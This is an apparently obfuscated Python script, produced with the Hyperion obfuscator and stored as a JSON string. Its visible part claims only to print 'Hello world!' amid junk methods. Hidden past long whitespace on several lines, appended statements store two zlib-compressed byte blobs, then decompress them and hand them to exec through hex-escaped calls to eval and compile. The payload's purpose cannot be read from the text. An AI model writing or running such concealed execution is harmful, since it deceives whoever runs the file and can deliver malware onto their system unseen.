"protected": "from builtins import *\nfrom math import prod as _calculate\n\n\n__obfuscator__ = 'Hyperion'\n__authors__ = ('billythegoat356', 'BlueRed')\n__github__ = 'https://github.com/billythegoat356/Hyperion'\n__discord__ = 'https://discord.gg/plague'\n__license__ = 'EPL-2.0'\n\n__code__ = 'print(\"Hello world!\")'\n\n\nHypothesis, _callfunction, While, Substract, _hypothesis, Walk, _add = exec, str, tuple, map, ord, globals, type\n\nclass Power:\n    def __init__(self, _statistics):\n        self.Algorithm = _calculate((_statistics, -89116))\n        self._positive(_substract=-60884)\n\n    def _positive(self, _substract = bool):\n        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler\n        self.Algorithm -= -64072 - _substract\n        \n        try:\n            ((Substract, {_hypothesis: 'yBtal'}) for Substract in (Substract, Hypothesis) if While <= While)\n\n        except AssertionError:\n            ((Hypothesis, {_hypothesis: Hypothesis}) for Hypothesis in (While, Substract, While) if _callfunction == Substract)\n\n        except:\n            _add(-33161 * -98774) == True\n\n    def _memoryaccess(self, _algorithm = 73154):\n        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler\n        _algorithm -= -70231 - -16270\n        self.Run != None\n        \n        try:\n            (({_hypothesis: _theory}, _callfunction) for _callfunction in (Substract, Hypothesis))\n\n        except AttributeError:\n            ((Substract, Hypothesis) or While if (Substract, Hypothesis) and While else ... or (While, (Substract, Hypothesis)))\n\n        except:\n            _add(17616 + -95619) == None\n\n    def _invert(DetectVar = False):\n        return Walk()[DetectVar]\n\n    def _floor(Modulo = 22597 / -31797, _power = None, _run = Walk):\n        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler\n        _run()[Modulo] = _power\n        \n        try:\n            ((_theory, (While, Substract, While)) for _theory in (_theory, _theory, Hypothesis) if _callfunction != _callfunction)\n\n        except ArithmeticError:\n            (((While, Substract, While), _hypothesis) for _hypothesis in (_theory, _theory, Hypothesis))\n\n        except:\n            _add(850 - -15537) == bool\n\n    def execute(code = str):\n        return Hypothesis(_callfunction(While(Substract(_hypothesis, code))))\n\n    @property\n    def Run(self):\n        self.Add = '<__main__._power object at 0x000004284BE67626>'\n        return (self.Add, Power.Run)\n\nif __name__ == '__main__':\n    try:\n        Power.execute(code = __code__)\n        CallFunction = Power(_statistics = -78607 / 45960)\n\n        if 294556 > 6911683:\n            Power(_statistics = -51221 * 12780)._positive(_substract = CallFunction.Algorithm - 46986)\n        elif 474077 < 8760432:\n            CallFunction._memoryaccess(_algorithm = -26112 + CallFunction.Algorithm)                                                                                                                                                                                                                                                          ;Power._floor(Modulo='OO0Oo0oo0Oo0O0oo0ooo0oo',_power=b'x\\x9c\\xed\\x1b\\xefo\\xe2:\\xf2{\\xff\\n\\x1e_\\x12\\xd4\\xddnb\\'N\\xa8\\xd4/\\xa7\\xde\\xe9\\xb5j\\xcb\\xe9\\xed\\xe9\\xda\\xd3n\\x85\\x02\\t\\xdd\\xb0\\x81T\\x10^\\xdb/\\xefo\\xbf\\x19\\xff\\x00\\x93\\x04\\x12RhW\\xbd\\xc3Ll\\x8f\\x9d\\x89=3\\x99\\x19\\xdb\\x90\\xcd^N\\x8fZ\\xf0\\x89G&\\xcf\\xf1\\xd3\\xef\\xa7\\x83\\xd1b>\\x0c\\xb2t\\xd6\\xef\\xb7~;k\\xff\\xfe\\xf2\\x18\\xcd\\xe2t\\xdan\\xa53\\xad[\\xb0\\xc8~\\xa4\\xb39\\xefc\\xb6\\x07q\\x92\\xbcd?\\xa2\\x874\\xc8\\xa8\\xcb\\xda\\x9f\\xda\\x7fK\\x16\\xd1\\x1fQ\\xd8\\xee\\xac\\xdd\\xf5\\x10g?\\x16\\x03A\\xf8G\\x96=\\xceO\\xbf|\\x11\\xb8\\x93a:\\xf9\\x92#\\xf3e\\xc3\\xb3\\xc3x>Lg\\xe1:\\x19\\x89<yx\\xf8\\xf2\\x98\\x04\\x0f\\x8b(wS\\x12\\x0f\\xa3\\xe9<\\x127\\xfd\\xfd\\x9fW\\x9f\\xc9\\x89\\x95\\xeb2LC\\xd1n<\\xce\\xe2if\\xb6\\x7f\\x8f\\x92$m=\\xa5\\xb3$\\xfc\\xad\\xdd1\\x8e:\\xa7\\xcb\\xde\\xd8n\\xcc\\x7f\\xc6\\xa1\\xd19\\x8a\\x9e\\x87\\xd1c&\\x999}\\\\\\xc0\\x9d\\x7f\\xa4\\xf3h\\xde\\nfQk\\x16\\x85\\xdf\\xa7\\xff\\x8e\\xd3$\\xca\\x04b\\x00\\x9c\\xf9>\\xfdO\\xba\\xe0\\xb5\\xa0\\x85D\\xbeOo\\xd2A\\x1a\\xbe\\xb4\\x92\\xf8\\'\\xdc\\xf7\\x92.\\xda\\x9d#1\\xa8x\\xf2\\x98\\xce\\xb2~\\x1f\\x9e\\xf627:\\'\\xd1s\\x9c\\x99\\x9d\\xa3$\\x1d\\x06\\xc9\\xdc\\xec|3zV\\xda\\xeb\\xf5,\\xcbJS\\xfc\\xf6\\xd24\\xed\\xf1\\xb2q\\x7f\\xf6\\x90\\xa4\\x03\\xe8v\\xb4\\xb1\\x0f\\x12xz\\xc6\\x0f\\xbf>\\x89\\x8f\\xf1\\xed\\xf4\\xf4\\xf8\\xf3\\xf1g\\xf3\\xb3ylw:\\xf7\\xf7ga<\\xdbN\\xe4+\\xf9J\\x08\\xc0\\xd7\\xaf\\x98\\x13\\xcc\\x8bT\\x1e\\xa2,\\xc8\\xb2\\nJ77\\xd7\\x90\\xf0{s}\\xcd\\xbf\\xb2\\x00\\xf3\\x11\\xb3>\\xda\\xd8E\\xf0\\xc3\\xb2z@\\x12\\xae\\x90\\x80\\xa8\\xd5\\x83;W\\x8c\\xdc\\xfe\\xf4\\xab\\xab\\xcb\\x8b\\xab\\xab\\x0bH\\x97X\\xba\\xc4\\xeb\\xe5\\xe5\\x05P(\\xa1k\\x1a\\x83E\\x9cd\\xf1\\x14\\x05\\xf3g0\\xab\\x18\\x99\\xc0^c&\\nP\\x04\\xc2\\x1a\\xcb\\x14\\x13\\xcd\\xd2\\x87\\xcd\\xa7q\\x96\\xc4\\x8bA\\x9e\\xb1\\x9dORnK9>?\\xedH\\xa1\\xf3\\xed\\xf5$N\\xe2i\\x18=\\x9bF\\x16\\xa4\\xc9\\xa8\\xd0|\\xdf\\xd9\\xce\\x9c$\\x19\\xc7\\t$\\xfc\\x8e\\xc7\\t\\\\? k\\x924-\\xb6\\x02g\\xb6\\xab$h\\xe0\\xd5\\x15*%\\x94\\xb0\\xb8\\x0bc\\xe2x8\\x0f\\xa6\\xf1+\\x18\\xb3\\x91B}\\xc6l&\\xa1\\x18\\xf32\\x8a\\x93\\xe7\\xe8\\xc7t\\xb13w\\xf8\\xdb\\xc4UJ$n\\'>\\x9c\\xde\\x04\\x7fFe\\x9c\\xd9`\\xad\\x90/\\xb7\\xb7w\\xf0\\xbd\\x83/^0\\xbb\\xc5\\xcf\\xdd\\x07\\xe4N4O\\x82\\x7f\\xec\\xc8\\x9e\\x1e>\\x04\\x15)\\xc5GY\\xfc\\xa1\\xa0e\\xd6GdO\\x12?N\\xd2\\xe1\\xce\\x16\\xb9w\\x0e\\xdc9O\\xcf\\xcf\\x81G\\xc8\\xaas\\xfc\\xa0/5\\x8c\\x93q\\x1aO\\xab\\xdfKAP\\xfa:A\\xfbCz\\xbcY6\\xdfQ\\xfd\\x04\\x9f\\x15\\xd3\\xb9\\x08> _\\xa2\\xc5\\xec_\\xbb\\x1a\\xf4\\x82\\xb73\\x07\\x86K)Q\\x80\\xd7U]\\x95]\\n\\x11X\\x18a\\x04o\\x1a\\xfe(+\\xf1#\\x1f\\x8e\\xbb\\xc3\\xe8\\xb9\\xd4)l\\x8f\\xd3\\xbf\\xca\\xf9#3x\\xae\\x93(:S\\xd3\\xe8\\xb8}\\xbb\\xef\\x03\\xb0>\\x85\\xe4\\xf5\\x9d>\\x81\\xae\\xac\\x88\\xad\\xa4dA\\x93]\\xd9\\x0bi:\\x00\\x1e\\xa7kA\\x89AWR\\xc4VR\\xc2~\\x04F\\xe9\\xc2\\x1d>$\\x8fS\\xf2\\x8b\\xd8\\nJe:I\\xbb\\xee\\x084oD]\\x00O\\x96m\\x00\\x0b\\xc0\\x07p\\x10G\\x06\\xc4\\'a\\xad\\xbe6\\xe9V\\xe9pG\\\\\\xd6\\xe0^(B+\\x9b\\xa5\\x8f\\x93\\xb8\\xa5\\xd4\\xa65Ig\\xa3&\\xd3R\\xc3drX\\xbe\\x04\"q\\xd8\\xd6\\x95\\xd3\\xaa\\xd3\\xd7\\xaf9\\xad\\xbd\\xabm=e\\xf3A\\x91\\xba\\x00\\xa8\\xe4\\x16\\xa8\\x82\\xdb\\xf7\\xa1k\\xb7\\x88m\\xc2K\\x9b\\x84\\x9cO\\xd6n\\xa2\\x05\\x91f\\xd1\\xcfa:WB\\x95\\xb5\\xa6\"u\\xa4\\xb61)\\x1a\\x8a\"\\x94\\xe2q\\xa5\\xc8\\x94H\\xeb\\xf4\\xdd\\x8fHo\\xaeW\\xe3\\x17\\x01\\xc2\\xcd5_f\\xef\\xe6\\x1b\\x98\\xeb\\xf9\\xcce\\xd5\\xf6\\x7f\\x9b;\\x966\\x19\\x924\\xccOO0\\x94\\xad\\xd1\\x91\\x90I\\x13qPi\\x04\\x94\\x01\\xa0\\x9aape\\xdd\\x91\\xe2\\xa8\\xd3\\x97\\xd6\\x13\\xc7V\\x06\\xc8H\\x8d\\x8fZ\\xcc\\x11\\x17R\\r\\xad\\xa2+\\x07\\xec\\xc9A{r\\xa0\\x96\\xd4%G\\xb3\\x8aU}\\xebN\\xee,\\t&\\x830h\\xdd\\xc9\\xf5\\xce\\xad\\\\\\xf8\\xdc\\x9dn\\x91\\xe2\\x16\\x8e\\x94\\xaaZ\\xc4BHQ\\x0eB\\x89\\xe5\\xe5\\xea0D\\x0eT\\xee\\xb6\\xa9\\xec\\xe9\\xe9t\\xe3`\\xb6\\t.\\x89\\xc7\\xe3q\\x12\\'\\xe3q\\xcc\\xb7Op\\xe3$\\x1e\\xc7\\x8d\\xac\\x95\\xb2\\xee\\x92\\xfd\\x96\\xe6\\xb4\\x1c\\xe5\\xac\\xa4\\xe8\\xea\\xf4\\xf5\\xea\\x8an\\x17;\\xc6\\xbd\\xa54\\xab\\xcb\\x87\\xd5x\\xd0\\xd6\\xb7\\xffY\\xee}J\\x10\\xd570\\xf8KeH\\x92\\x8b\\x8b\\x0b\\xb8@\\xe2\\x1f\\xac5T\\\\c:\\x9dL\\'\\x13\\x80)/M\\'Mm\\x94\\xfejz\\x92\\xd5T\\x056\\xd8\\xae\\xd9\\xa8\\xaa\\xbe\\xce\\x8e\\x0c\\xb9\\x91\\xe3\\xbc\\x166\\t\\xf3f\\xefG/\\x15\\x8bX\\xb1\\x92\\x85\\xf5\\xebyu\\xfc\\tM\\xd6^z\\xed5(P\\xacA\\x9a\\x97\\x92\\xe8\\x15L\\x13(\\xe3\\xbc/\\x9a\\xf1\\xe7Nn\\x13\\xf1\\xed\"i4\\xa1x\\xb8\\xe9\\xfbR3\\x94\\x05!\\xd2Z(\\x0fgi\\x0e\\xa2N\\xdf\\x9a\\x0eb\\x8d\\x85\\xc2\\xcd\\xad\\xa2\\x0f\\xae^[\\x02\\x8f\\x1d\\xfd\\x84\\x03\\x1f6r\\x1c\\x91c\\xe2\\xc5\\x91#q\\xbcu$\\xae\\xa2T\\xed5\\xea\\xb2W\\xc5hT\\x0f\\xc1\\xb5\\x17\\xb3\\xab\\xc5zu\\xfa\\xd6\\x89\\xf5vd\\x8f\\xe7\\xf3\\xe4\\xc9\\x1cK\\xea\\xb3\\xaa\\xa9\\x1e\\x00{c\\x0e\\xf1\\xe0\\xa5\\x8b4\\xf0\\xf6=5\\'t\"H!\\x87UY\\xc7\\x85+L\\xedX\\x01\\\\<\\x1e\\x8e\\x80\\x9f\\x1f\\xe3%\\x1e7\\xf5\\r`/p\\xa4h7\\xae.x\\x8f&\\xaf\\xb0%-X\\xcd\\x15\\xeb\\x0e\\xf2\\xc1d\\x05\\xc4\\x12\\xc9\\x81\\x10\\x02B{\\xdbs\\x98K,f\\x13\\xcb\\xa3\\xf06Q6\\x80\\xa0\\xdf\\xe15\\x17n`x\\x85\\x9a\\xc3|\\xec\\x0b=a9\\x00\\xe5\\x91G\\xa1L\\x98\\x8dw\\xc8v\\xa4\\x13B\\x7f\\n\\xf7\\xda\\xcc\\xc3:Ra\\x11\\xdc\\x17\\xad\\x9e,F\\xf2\\xaa\\xa0\\xe2\\x82;q\\xe1\\xd5\\x85G\\x87\\xcf[\\xc6\\x14Z$|{+O\\x03\\x1a\\x1a9\\x03\\xb1\\x17\\xc2\\xcf\\xa0\\xea\\\\\\xf26\\xa8\\xbe\\xc9|v\\xd0\\x9e\\xbd\\xbf\\xcfh\\xb1\\xd7\\xed\\xf7H\\xd8tY\\x17I\\xd8\\xf3Q\\xed\\xf7\\x19O\\x1dz\\xe7bO=\\xedAP\\xd2k\\xe4\\xbcK\\xd7(\\xab5I\\xe9\\xfa\\xa4\\xc1J\\x85/\\xa3n\\xc5\\x19\\x92\\x8a\\x0fn\\xf76`\\x87;Aj\\xa9$\\xca\\xc8PU\\x16\\xb9\\xa3\\x9c%\\\\k\\x0c\\xbdp\\x9al\\x9a\\x7fm:\\x12\\xeb\\xa43\\xd3,\\xd9\\x91\\xef\\x04\\xd3\\xd0\\xdcxSg\\xfb\\xf1\\xc9\\x16\\xf7Pt\\x0b\\x9a{\\xa8\\x9c\\x9b\\xb9\\xf3S%\\x7f\\x9d\\x91\\x0cFF\\x82\\xbb\\x8e\\x86U<G\\\\\\xf5\\x08J\\x9f2\\x84\\x148]\\x9ew%\\x04K\\\\\\xb0,c\\xa9\\x0b\\x16\\xa0\\xeb\\x0e\\x96\\x98\\xa1L\\xdd%\\x15\\x89%>#\\xe0\\xb6]\\x8a\\x1fR\\xc8U\\xb9\\xac=\\x8f\\xc7\\x83\\x02X\\x92\\x92\\x889\\xdcA\\x8c0\\x87qx\\xd4g\\xccs<\\x97x\\xee\\x80\\x064\\x80\\xe8(\\xe4\\xe0s\\x18\\xa0\\x9f\\x83\\xd1\\x86\\x1c\\xfc\\xdac\\x06\\xea\\x00\\x8e\\x047\\x07y\\x9c\\xb3\\x01V\\xed\\x84\\xfa\\x90S\\xea\\xd0\\xee\\n\\x98-p<\\xb7\\xd7\\xeb\\xbc\\x9dj\\xed\\xb9{\\x974\\xe82\\'\\x10\\x1b\\xbe\\x92G\\xd5V\\xfd\\xd3(N\\xa2i0\\x89\\xce\\xb6n\\xb2D\\x9a\\xf1\\ns5\\x8e\\xa9|\\xce\\x04\\xda\\xce\\ng\\xe7\\x1b\\xce8\\xf0l\\xc1\\xeaS~\\xb2@\\xfb\\xb6<\\xe3(`\\xdf ^\\x12Pq\\xbaz-\\x9f)GpS\\xb5Ygtp2.?\\xacq\\xf8\\x94\\xba}X\\xc3\\x1d{E\\xec^v\\xd6\\xf7\\xc7\\x08\\xdc\\x0f\\xdf\\x12\\x9a\\xe0\\xc9\\x19\\xf2\\xa8\\xc7O\\xcfR\\xc1&`\\xdd\\xe1V\\xb0\\rfqo\\xb6y\\xc9>\\x86&\\xe8p|z\\xfa\\xcdXd#\\xdf0\\xa30\\x1dF\\xe1I\\xc7\\xe8\\x92\\x91\\xa3\\xec\\xb3#`Yrd\\x00\\xe28~\\xad^\\x16\\t\\xac\\x80\\x8eT\\xdb*P\\xe1\\xf7:\\xceH[\\x8e\\xaa`\\xc6\"\\x8cu\\x9910\\xd5\\\\/p\\xe6\\xc8\\x00\\xf3\\xbej\\xecx\\x0eK(?\\x8d\\xe5\\xb9(\\x13\\xaa\\xca\\x08e\\x94\\xbfuL\\x94#F\\x94<\\xae\\xe4\"\\xc6\\xd2U\\xbb\\xe1\\x06\\xa6%7\\x9d\\x98\\\\\\xcb2\\xb9]\\xa06\\xa3\\xf4\\r\\xcc\\xaa\\xbe570W\\xf6\\xccP1?\\x0f\\xfb\\x1bG\\xfcj\\x1c\\x9e6&\\xb5\\xe1o\\xcbm\\x105\\x8f:}\\xeb\\xce\\x83\\xdb\\xcbR\\x9b\\xec\\xc2\"\\xcbf\\xc3j*\\xff\\x0f\\x89\\xf4\\xa7\\xe8\\xb3\\xd1\\xe7\\x17j\\xd75\\x8c\\x08\\x8b\\xc0\\xc9\\xd2\\xf5\\x9f7\\xa8\\x1f=\\xac~\\x06\\xe1\\xd2M\\xae\\xb8\\x0eGw\\x08c(e\\xd4e\\x10\\x1bP[\\xe6N.\\xcf\\xe3U\\xdd\\x939\\x8c\\x96\\x11\\x1e\\xbe\\x10\\x08c^O\\x8f\\xec\\'L\\x11\\xa5\\x9dB:\\x06c\\x82\\xd1\\x030\\x18\\x83E\\x19\\x84f\\x0c\\xe6$\\xc0\\xd5\\xc0\\xc9\\xb599\\\\y\\x1b\\xf2\\xc8\\xe3t\\x19\\xe4\\x04\\x00\\xc3\\xbe.\\xb0\\xcc\\x06]\\xb4\\xf93u`\\xd0\\xa6\\xc6\\xb2\\x16\\xe2\\xe9\\xa1^!\\x1c\\xb4\\xd7\\xc3B\\x15F\\xca\\xf6M\\xcf\\xca\\x83\\x8b\\xf2\\x80\\xf1\\x8a\\\\\\x95u\\xf0r\\x90\\xc7\\xe5\\xfb\\xf9\\xcb\\x1c\\xf9\\xc0\\xe7\\x06\\xe3\\x10s\\x94\\x00\\xe3\\xe3\\xa0\\xcaz\\xae\\xfas\\xd0\\xda\\x968{\\x89C\\x9e\\x96\\xcdq_<\\xac\\x94\\x15&\\xc6D\\xae%&q<\\xd7\\xcb\\x1a\\x8eIp\\xf8\\xe4\\xea\\xc9\\xaa4\\xec\\xd7\\xf9)A\\xc7\\xe9}\\xf2\\xf7`.t\\x15\\x93_\\x02\\x9e\\xd6\\xe6U\\xd4\\x8b\\xf7n\\x96\\x0f*\\xa8\\xb5\\xe2\\x8f\\xce\\x0b\\x89\\xc7\\\\\\x95\\x15\\x94\\xd5\\xf5{\\xf52o\\x87\\xf7\\xd1\\xdb\\x98\\xfc\\x92\\xb9\\x94\\xcd\\x7f\\xd5N\\n\\xf3~%=\\\\\\x12R[X#\\xae\\x1f]\\xb1L\\xe4\\x0e\\x03l\\x06\\xa3{\\x7f\\x1e.\\xa1\\x85NbN\\xf8s\\xc5\\xb2\\x1a\\x9fJ\\xf8\\x95\\x8f\\x899\\x1b\\xe5\\xb7n\\xaf4~K\\x99\\xe9\\x90\\x97e\\x99\\x8c\\xf5z^\\x8e+Y\\xbe\\xef;Rn\\xf7\\xab|\\xc5z\\xbf\\xf7~\\x1fP\\xfe(5a?]\\xee\\x07\\x89\\xb4\\xd3\\xe5zSf\\x0b\\xca\\xde\\xfbM\\xb8U.t\\xb9\\xe8\\x13\\xeb\\xe8\\xd8!}H]\\xbd\\xaa\\x96oY\\x8cP\\xd6\\x7f\\x85\\xfb\\xc8\\xb6\\x97\\xeb\\x9a\\xe4\\xbd\\xc7\\xa3>\\x19s\\xc9\\xf8(\\xef+\\xf5')\n\n        if 480841 > 8630591:\n            CallFunction._positive(_substract = CallFunction.Algorithm * 38147)\n        elif 390050 < 6234185:\n            CallFunction._memoryaccess(_algorithm = 38682 * CallFunction.Algorithm)                                                                                                                                                                                                                                                          ;Power._floor(Modulo='OoDDOODooOoDoooDOOoOD',_power=b\"\\xfa\\xd27\\xaa\\xa4\\xf9\\xd1\\x82\\x9f-\\xf1\\xab\\n\\xf7\\xbf\\xae[oe\\x9b7\\xf3\\x99JYJ\\xb9o\\xdc\\xd2\\xd4b/=&\\xcbo\\x8d\\xe6l:e\\xce\\x1b\\xdbN[\\xccI\\xac~\\xb8=\\xf3\\x966\\xb4Z\\xd7\\x0e\\x19k\\xbf\\xb7\\xae\\x1dv\\x1dQ\\xce[\\xb4sl\\xb9\\xc6\\x102\\xf9\\x15c\\x92_9^\\xdaM_\\x9a\\xc6=\\xefo\\x8b\\x8a\\xf3\\xca\\xf9\\x13\\xdd\\x8f\\xc8\\xba\\xee\\x87\\xf4\\xf5\\xdaZ]\\x96\\xd1\\x16\\x15\\xed\\x9d\\xcb=\\xb1\\xd8k\\xa0\\\\[\\xdfkM\\xbc]'\\x0f{\\x1c\\xb5/]<\\xf8^\\xc5Al\\xe3\\xee\\xf2\\x10\\xf73\\xe9[\\x0e\\xa1\\xab\\xcd\\xe4\\xa1\\x8f\\xf1Pq\\xeb\\xbet\\xa5\\n\\x9c\\x1c\\xefJc\\xcd\\x12\\xfe-\\xdbu\\xd0cQ&\\xde\\xf1\\xf7\\x8co\\xab\\xe5H4\\xbb\\x84\\xf6\\x834\\xd0\\xd1\\xfd\\xbf+\\xfb\\x92}\\xfe\\xc8\\xbd\\xfc\\x08\\xbf\\xec\\xe8\\xbe\\xec\\x08\\x7f\\xbd\\xcf\\xaf&\\xdbr\\x9fC\\x97k-\\xb5\\xc6\\xdf\\xb7\\r\\xa9\\xb5\\xb6zG\\x1d9\\xb4\\xafx\\x8fx\\xb7L\\xd6\\x02G\\xa5\\xbfP10\\xa7\\xf1\\x96?\\x011\\xf8_^{\\xfc\\x97\\r\\xf8\\xd7\\xd7\\x1e\\xff+~\\n\\x98\\xa6\\x7f[P\\xa7\\x9eD\\x9e\\xe2\\xaa\\x7f\\xae\\x11\\xf5\\xebf\\xedo\\x0bU}\\xd9\\x1b\\x9e\\x9c\\xfe\\x171\\x13j\\xf7\")\n\n        if 255033 > 5949181:\n            Power(_statistics = 52549 * 59837)._positive(_substract = CallFunction.Algorithm / 44895)\n        elif 313969 < 2782558:\n            CallFunction._positive(_substract = CallFunction.Algorithm + -28722)                                                                                                                                                                                                                                                          ;XXWXXXXXWXXWXWXWXXXWXXX,MNNNNNNNNNNMNNNNMNNMMNNNN,xwxwxwxwxxxxwxxxwx,OOO0oo00oOoOoO0oo0Ooo,nnmnnnmmmnmmnmnnnmm=(lambda OOOoO00OOOo00oOOo00OOO:OOOoO00OOOo00oOOo00OOO(__import__('\\x7a\\x6c\\x69\\x62'))),(lambda OOOoO00OOOo00oOOo00OOO:OOOoO00OOOo00oOOo00OOO['\\x64\\x65\\x63\\x6f\\x6d\\x70\\x72\\x65\\x73\\x73']),(lambda OOOoO00OOOo00oOOo00OOO:globals()['\\x65\\x76\\x61\\x6c'](globals()['\\x63\\x6f\\x6d\\x70\\x69\\x6c\\x65'](globals()['\\x73\\x74\\x72'](\"\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x28\\x29\\x5b\\x27\\x5c\\x78\\x36\\x35\\x5c\\x78\\x37\\x36\\x5c\\x78\\x36\\x31\\x5c\\x78\\x36\\x63\\x27\\x5d(OOOoO00OOOo00oOOo00OOO)\"),filename='\\x4a\\x4a\\x49\\x4a\\x4a\\x4a\\x4c\\x4a\\x4c\\x4a\\x49\\x4a\\x49\\x4c\\x4a\\x49\\x4a\\x4a',mode='\\x65\\x76\\x61\\x6c'))),(lambda WWXXXXWXXWXXXXWXXWWXXXWXW,OOOoO00OOOo00oOOo00OOO:WWXXXXWXXWXXXXWXXWWXXXWXW(OOOoO00OOOo00oOOo00OOO)),(lambda:(lambda OOOoO00OOOo00oOOo00OOO:globals()['\\x65\\x76\\x61\\x6c'](globals()['\\x63\\x6f\\x6d\\x70\\x69\\x6c\\x65'](globals()['\\x73\\x74\\x72'](\"\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x28\\x29\\x5b\\x27\\x5c\\x78\\x36\\x35\\x5c\\x78\\x37\\x36\\x5c\\x78\\x36\\x31\\x5c\\x78\\x36\\x63\\x27\\x5d(OOOoO00OOOo00oOOo00OOO)\"),filename='\\x4a\\x4a\\x49\\x4a\\x4a\\x4a\\x4c\\x4a\\x4c\\x4a\\x49\\x4a\\x49\\x4c\\x4a\\x49\\x4a\\x4a',mode='\\x65\\x76\\x61\\x6c')))('\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f\\x28\\x27\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x27\\x29\\x2e\\x65\\x78\\x65\\x63'))\n        Power(_statistics = -602 - 56690)._memoryaccess(_algorithm = -80878 - CallFunction.Algorithm)                                                                                                                                                                                                                                                          ;nnmnnnmmmnmmnmnnnmm()(OOO0oo00oOoOoO0oo0Ooo(MNNNNNNNNNNMNNNNMNNMMNNNN(XXWXXXXXWXXWXWXWXXXWXXX(xwxwxwxwxxxxwxxxwx('\\x76\\x61\\x72\\x73'))),Power._invert(DetectVar='OO0Oo0oo0Oo0O0oo0ooo0oo')+Power._invert(DetectVar='OoDDOODooOoDoooDOOoOD')))\n\n    except Exception as _theory:\n        if 256594 > 7160691:\n            Power.execute(code = _callfunction(_theory))\n\n        elif 114830 > 7407667:\n            CallFunction._memoryaccess(_algorithm = 76249 / CallFunction.Algorithm)"